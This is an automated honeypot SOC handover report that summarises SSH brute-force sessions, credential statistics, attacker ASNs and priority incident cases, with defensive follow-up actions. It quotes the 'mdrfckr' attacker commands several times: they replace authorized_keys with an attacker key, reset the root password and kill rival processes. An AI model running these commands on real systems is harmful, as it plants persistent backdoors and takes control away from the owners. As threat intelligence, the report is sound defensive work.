# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-20 |
| **Generated At** | 2026-03-20T18:45:14Z |
| **Shift Time** | 18:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **572** |
| Confirmed Threats | **321** |
| False Positives Filtered | **251** (43.9%) |
| Unique Attacker IPs | **212** |
| Countries of Origin | **31** |
| High Severity Cases | **43** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **529** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **262** |
| Unique Credential Pairs | **213** |
| Unique Usernames | **141** |
| Unique Passwords | **159** |
| Successful Auth Pairs | **41** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 43 |
| `345gs5662d34` | 14 |
| `admin` | 9 |
| `user` | 8 |
| `nobody` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `123` | 13 |
| `3245gs5662d34` | 13 |
| `12345` | 9 |
| `password` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 13 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 4 |
| `admin` | `admin` | 3 |
| `Accept-Encoding: gzip` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `q123456789` | `217.154.35.203` | 2026-03-20T01:43:26 |
| `root` | `3245gs5662d34` | `217.154.35.203` | 2026-03-20T01:43:30 |
| `root` | `121212` | `58.56.151.234` | 2026-03-20T03:08:14 |
| `root` | `qweasdzxc123.` | `120.48.55.25` | 2026-03-20T03:40:35 |
| `root` | `!@#QWEasd` | `120.48.55.25` | 2026-03-20T03:46:18 |
| `root` | `abcd1234..` | `206.189.191.70` | 2026-03-20T04:53:41 |
| `root` | `3245gs5662d34` | `206.189.191.70` | 2026-03-20T04:53:52 |
| `root` | `ubuntu` | `180.76.147.239` | 2026-03-20T07:06:24 |
| `root` | `123lol123` | `27.39.130.144` | 2026-03-20T07:22:18 |
| `root` | `Zaq12wsx!` | `95.39.82.218` | 2026-03-20T07:24:09 |
| `root` | `3245gs5662d34` | `95.39.82.218` | 2026-03-20T07:24:13 |
| `root` | `ubuntu` | `180.76.171.14` | 2026-03-20T08:13:43 |
| `root` | `69696969` | `172.173.117.246` | 2026-03-20T09:13:18 |
| `root` | `3245gs5662d34` | `172.173.117.246` | 2026-03-20T09:13:23 |
| `root` | `69696969` | `34.69.0.72` | 2026-03-20T09:14:58 |
| `root` | `3245gs5662d34` | `34.69.0.72` | 2026-03-20T09:15:04 |
| `root` | `qwerty12345` | `223.107.72.234` | 2026-03-20T09:34:29 |
| `root` | `Root1234` | `101.36.109.176` | 2026-03-20T09:36:20 |
| `root` | `3245gs5662d34` | `101.36.109.176` | 2026-03-20T09:36:23 |
| `root` | `Cloud@123` | `101.36.106.113` | 2026-03-20T10:38:01 |
| `root` | `3245gs5662d34` | `101.36.106.113` | 2026-03-20T10:38:04 |
| `root` | `P` | `101.47.13.68` | 2026-03-20T10:39:48 |
| `root` | `kjashd123sadhj123d1SS` | `106.13.85.199` | 2026-03-20T10:48:13 |
| `root` | `root2014` | `219.128.15.190` | 2026-03-20T10:53:35 |
| `root` | `root2014` | `179.185.29.233` | 2026-03-20T10:53:49 |
| `root` | `Hik12345` | `8.154.28.84` | 2026-03-20T12:45:06 |
| `root` | `r00t` | `118.45.101.159` | 2026-03-20T12:46:52 |
| `root` | `r00t` | `115.244.235.242` | 2026-03-20T12:47:04 |
| `root` | `Password2025` | `197.211.55.20` | 2026-03-20T12:53:54 |
| `root` | `3245gs5662d34` | `197.211.55.20` | 2026-03-20T12:53:59 |
| `root` | `5555555` | `218.29.196.162` | 2026-03-20T14:48:11 |
| `root` | `Qwer-1234` | `59.126.224.134` | 2026-03-20T15:15:19 |
| `root` | `3245gs5662d34` | `59.126.224.134` | 2026-03-20T15:15:23 |
| `root` | `aa789789` | `102.88.137.80` | 2026-03-20T15:16:59 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-03-20T15:17:06 |
| `root` | `aa789789` | `120.62.8.17` | 2026-03-20T15:21:55 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-03-20T15:21:56 |
| `root` | `Admin111` | `120.62.8.17` | 2026-03-20T15:23:51 |
| `root` | `p@ssw0rd` | `120.62.8.17` | 2026-03-20T15:25:43 |
| `root` | `debian` | `106.75.177.183` | 2026-03-20T15:44:09 |
| `root` | `2` | `106.14.182.77` | 2026-03-20T17:43:36 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:3kNpwXveMV7N"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.55.25`, `8.154.28.84`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `172.173.117.246`, `101.36.109.176`, `59.126.224.134`, `120.62.8.17`, `102.88.137.80`, `217.154.35.203`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **212** |
| Unique ASNs | **98** |
| High-Risk ASNs | **64** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 15 | LOW |
| `AS4134` | CHINANET-BACKBONE | 13 | HIGH |
| `AS8075` | Microsoft Corporation | 11 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 10 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | LOW |
| `AS4766` | Korea Telecom | 6 | HIGH |
| `AS17421` | Mobile Business Group | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a72e163233d0

| Field | Detail |
|---|---|
| **Source IP** | `58.56.151[.]234` |
| **First Seen** | 2026-03-20 03:08 |
| **Last Seen** | 2026-03-20 03:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:08:12` | `cowrie.session.connect` |
| `2026-03-20 03:08:12` | `cowrie.client.version` |
| `2026-03-20 03:08:12` | `cowrie.client.kex` |
| `2026-03-20 03:08:14` | `cowrie.login.success` |
| `2026-03-20 03:08:15` | `cowrie.direct-tcpip.request` |
| `2026-03-20 03:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.56.151[.]234` to AbuseIPDB if not already reported
- [ ] Block `58.56.151[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c5bb9a2cc4

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-03-20 03:40 |
| **Last Seen** | 2026-03-20 03:41 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:McK0dzOLqUuW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:40:32` | `cowrie.session.connect` |
| `2026-03-20 03:40:32` | `cowrie.client.version` |
| `2026-03-20 03:40:32` | `cowrie.client.kex` |
| `2026-03-20 03:40:35` | `cowrie.login.success` |
| `2026-03-20 03:40:35` | `cowrie.session.params` |
| `2026-03-20 03:40:35` | `cowrie.command.input` |
| `2026-03-20 03:40:35` | `cowrie.command.failed` |
| `2026-03-20 03:40:35` | `cowrie.log.closed` |
| `2026-03-20 03:40:36` | `cowrie.session.params` |
| `2026-03-20 03:40:36` | `cowrie.command.input` |
| `2026-03-20 03:40:36` | `cowrie.session.file_download` |
| `2026-03-20 03:40:36` | `cowrie.log.closed` |
| `2026-03-20 03:40:50` | `cowrie.session.params` |
| `2026-03-20 03:40:50` | `cowrie.command.input` |
| `2026-03-20 03:40:50` | `cowrie.log.closed` |
| `2026-03-20 03:40:51` | `cowrie.session.params` |
| `2026-03-20 03:40:51` | `cowrie.command.input` |
| `2026-03-20 03:40:54` | `cowrie.log.closed` |
| `2026-03-20 03:40:54` | `cowrie.session.params` |
| `2026-03-20 03:40:54` | `cowrie.command.input` |
| `2026-03-20 03:40:54` | `cowrie.session.file_download` |
| `2026-03-20 03:40:54` | `cowrie.log.closed` |
| `2026-03-20 03:40:55` | `cowrie.session.params` |
| `2026-03-20 03:40:55` | `cowrie.command.input` |
| `2026-03-20 03:40:55` | `cowrie.log.closed` |
| `2026-03-20 03:40:55` | `cowrie.session.params` |
| `2026-03-20 03:40:55` | `cowrie.command.input` |
| `2026-03-20 03:40:55` | `cowrie.log.closed` |
| `2026-03-20 03:40:57` | `cowrie.session.params` |
| `2026-03-20 03:40:57` | `cowrie.command.input` |
| `2026-03-20 03:40:57` | `cowrie.command.input` |
| `2026-03-20 03:41:03` | `cowrie.log.closed` |
| `2026-03-20 03:41:11` | `cowrie.session.params` |
| `2026-03-20 03:41:11` | `cowrie.command.input` |
| `2026-03-20 03:41:14` | `cowrie.log.closed` |
| `2026-03-20 03:41:15` | `cowrie.session.params` |
| `2026-03-20 03:41:15` | `cowrie.command.input` |
| `2026-03-20 03:41:16` | `cowrie.log.closed` |
| `2026-03-20 03:41:18` | `cowrie.session.params` |
| `2026-03-20 03:41:18` | `cowrie.command.input` |
| `2026-03-20 03:41:18` | `cowrie.log.closed` |
| `2026-03-20 03:41:19` | `cowrie.session.params` |
| `2026-03-20 03:41:19` | `cowrie.command.input` |
| `2026-03-20 03:41:19` | `cowrie.log.closed` |
| `2026-03-20 03:41:20` | `cowrie.session.params` |
| `2026-03-20 03:41:20` | `cowrie.command.input` |
| `2026-03-20 03:41:20` | `cowrie.log.closed` |
| `2026-03-20 03:41:21` | `cowrie.session.params` |
| `2026-03-20 03:41:21` | `cowrie.command.input` |
| `2026-03-20 03:41:21` | `cowrie.log.closed` |
| `2026-03-20 03:41:22` | `cowrie.session.params` |
| `2026-03-20 03:41:22` | `cowrie.command.input` |
| `2026-03-20 03:41:22` | `cowrie.log.closed` |
| `2026-03-20 03:41:23` | `cowrie.session.params` |
| `2026-03-20 03:41:23` | `cowrie.command.input` |
| `2026-03-20 03:41:24` | `cowrie.log.closed` |
| `2026-03-20 03:41:25` | `cowrie.session.params` |
| `2026-03-20 03:41:25` | `cowrie.command.input` |
| `2026-03-20 03:41:26` | `cowrie.log.closed` |
| `2026-03-20 03:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70dfb766d730

| Field | Detail |
|---|---|
| **Source IP** | `120.48.55[.]25` |
| **First Seen** | 2026-03-20 03:46 |
| **Last Seen** | 2026-03-20 03:46 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:3kNpwXveMV7N"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 03:46:17` | `cowrie.session.connect` |
| `2026-03-20 03:46:17` | `cowrie.client.version` |
| `2026-03-20 03:46:17` | `cowrie.client.kex` |
| `2026-03-20 03:46:18` | `cowrie.login.success` |
| `2026-03-20 03:46:19` | `cowrie.session.params` |
| `2026-03-20 03:46:19` | `cowrie.command.input` |
| `2026-03-20 03:46:19` | `cowrie.command.failed` |
| `2026-03-20 03:46:19` | `cowrie.log.closed` |
| `2026-03-20 03:46:20` | `cowrie.session.params` |
| `2026-03-20 03:46:20` | `cowrie.command.input` |
| `2026-03-20 03:46:20` | `cowrie.session.file_download` |
| `2026-03-20 03:46:20` | `cowrie.log.closed` |
| `2026-03-20 03:46:32` | `cowrie.session.params` |
| `2026-03-20 03:46:32` | `cowrie.command.input` |
| `2026-03-20 03:46:33` | `cowrie.log.closed` |
| `2026-03-20 03:46:33` | `cowrie.session.params` |
| `2026-03-20 03:46:33` | `cowrie.command.input` |
| `2026-03-20 03:46:34` | `cowrie.log.closed` |
| `2026-03-20 03:46:35` | `cowrie.session.params` |
| `2026-03-20 03:46:35` | `cowrie.command.input` |
| `2026-03-20 03:46:35` | `cowrie.session.file_download` |
| `2026-03-20 03:46:35` | `cowrie.log.closed` |
| `2026-03-20 03:46:36` | `cowrie.session.params` |
| `2026-03-20 03:46:36` | `cowrie.command.input` |
| `2026-03-20 03:46:36` | `cowrie.log.closed` |
| `2026-03-20 03:46:37` | `cowrie.session.params` |
| `2026-03-20 03:46:37` | `cowrie.command.input` |
| `2026-03-20 03:46:37` | `cowrie.log.closed` |
| `2026-03-20 03:46:38` | `cowrie.session.params` |
| `2026-03-20 03:46:38` | `cowrie.command.input` |
| `2026-03-20 03:46:38` | `cowrie.command.input` |
| `2026-03-20 03:46:39` | `cowrie.log.closed` |
| `2026-03-20 03:46:40` | `cowrie.session.params` |
| `2026-03-20 03:46:40` | `cowrie.command.input` |
| `2026-03-20 03:46:40` | `cowrie.log.closed` |
| `2026-03-20 03:46:41` | `cowrie.session.params` |
| `2026-03-20 03:46:41` | `cowrie.command.input` |
| `2026-03-20 03:46:42` | `cowrie.log.closed` |
| `2026-03-20 03:46:42` | `cowrie.session.params` |
| `2026-03-20 03:46:42` | `cowrie.command.input` |
| `2026-03-20 03:46:43` | `cowrie.log.closed` |
| `2026-03-20 03:46:45` | `cowrie.session.params` |
| `2026-03-20 03:46:45` | `cowrie.command.input` |
| `2026-03-20 03:46:46` | `cowrie.log.closed` |
| `2026-03-20 03:46:47` | `cowrie.session.params` |
| `2026-03-20 03:46:47` | `cowrie.command.input` |
| `2026-03-20 03:46:47` | `cowrie.log.closed` |
| `2026-03-20 03:46:49` | `cowrie.session.params` |
| `2026-03-20 03:46:49` | `cowrie.command.input` |
| `2026-03-20 03:46:49` | `cowrie.log.closed` |
| `2026-03-20 03:46:49` | `cowrie.session.params` |
| `2026-03-20 03:46:49` | `cowrie.command.input` |
| `2026-03-20 03:46:50` | `cowrie.log.closed` |
| `2026-03-20 03:46:50` | `cowrie.session.params` |
| `2026-03-20 03:46:50` | `cowrie.command.input` |
| `2026-03-20 03:46:50` | `cowrie.log.closed` |
| `2026-03-20 03:46:51` | `cowrie.session.params` |
| `2026-03-20 03:46:51` | `cowrie.command.input` |
| `2026-03-20 03:46:51` | `cowrie.log.closed` |
| `2026-03-20 03:46:52` | `cowrie.session.params` |
| `2026-03-20 03:46:52` | `cowrie.command.input` |
| `2026-03-20 03:46:52` | `cowrie.log.closed` |
| `2026-03-20 03:46:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.55[.]25` to AbuseIPDB if not already reported
- [ ] Block `120.48.55[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc9e45abc559

| Field | Detail |
|---|---|
| **Source IP** | `206.189.191[.]70` |
| **First Seen** | 2026-03-20 04:53 |
| **Last Seen** | 2026-03-20 04:53 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 04:53:40` | `cowrie.session.connect` |
| `2026-03-20 04:53:40` | `cowrie.client.version` |
| `2026-03-20 04:53:40` | `cowrie.client.kex` |
| `2026-03-20 04:53:41` | `cowrie.login.success` |
| `2026-03-20 04:53:42` | `cowrie.session.params` |
| `2026-03-20 04:53:42` | `cowrie.command.input` |
| `2026-03-20 04:53:42` | `cowrie.command.failed` |
| `2026-03-20 04:53:42` | `cowrie.log.closed` |
| `2026-03-20 04:53:42` | `cowrie.session.params` |
| `2026-03-20 04:53:42` | `cowrie.command.input` |
| `2026-03-20 04:53:43` | `cowrie.session.file_download` |
| `2026-03-20 04:53:43` | `cowrie.log.closed` |
| `2026-03-20 04:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.191[.]70` to AbuseIPDB if not already reported
- [ ] Block `206.189.191[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65806523c1de

| Field | Detail |
|---|---|
| **Source IP** | `206.189.191[.]70` |
| **First Seen** | 2026-03-20 04:53 |
| **Last Seen** | 2026-03-20 04:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 04:53:47` | `cowrie.session.connect` |
| `2026-03-20 04:53:47` | `cowrie.client.version` |
| `2026-03-20 04:53:48` | `cowrie.client.kex` |
| `2026-03-20 04:53:52` | `cowrie.login.success` |
| `2026-03-20 04:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.191[.]70` to AbuseIPDB if not already reported
- [ ] Block `206.189.191[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee50c66c7d01

| Field | Detail |
|---|---|
| **Source IP** | `180.76.147[.]239` |
| **First Seen** | 2026-03-20 07:06 |
| **Last Seen** | 2026-03-20 07:11 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 07:06:21` | `cowrie.session.connect` |
| `2026-03-20 07:06:21` | `cowrie.client.version` |
| `2026-03-20 07:06:22` | `cowrie.client.kex` |
| `2026-03-20 07:06:24` | `cowrie.login.success` |
| `2026-03-20 07:11:24` | `cowrie.session.file_upload` |
| `2026-03-20 07:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.147[.]239` to AbuseIPDB if not already reported
- [ ] Block `180.76.147[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fd5ccb3bde6

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-03-20 07:22 |
| **Last Seen** | 2026-03-20 07:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 07:22:16` | `cowrie.session.connect` |
| `2026-03-20 07:22:16` | `cowrie.client.version` |
| `2026-03-20 07:22:16` | `cowrie.client.kex` |
| `2026-03-20 07:22:18` | `cowrie.login.success` |
| `2026-03-20 07:22:18` | `cowrie.direct-tcpip.request` |
| `2026-03-20 07:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e973fb4bf7c

| Field | Detail |
|---|---|
| **Source IP** | `172.173.117[.]246` |
| **First Seen** | 2026-03-20 09:13 |
| **Last Seen** | 2026-03-20 09:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 09:13:16` | `cowrie.session.connect` |
| `2026-03-20 09:13:16` | `cowrie.client.version` |
| `2026-03-20 09:13:17` | `cowrie.client.kex` |
| `2026-03-20 09:13:18` | `cowrie.login.success` |
| `2026-03-20 09:13:18` | `cowrie.session.params` |
| `2026-03-20 09:13:18` | `cowrie.command.input` |
| `2026-03-20 09:13:18` | `cowrie.command.failed` |
| `2026-03-20 09:13:18` | `cowrie.log.closed` |
| `2026-03-20 09:13:19` | `cowrie.session.params` |
| `2026-03-20 09:13:19` | `cowrie.command.input` |
| `2026-03-20 09:13:19` | `cowrie.session.file_download` |
| `2026-03-20 09:13:19` | `cowrie.log.closed` |
| `2026-03-20 09:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
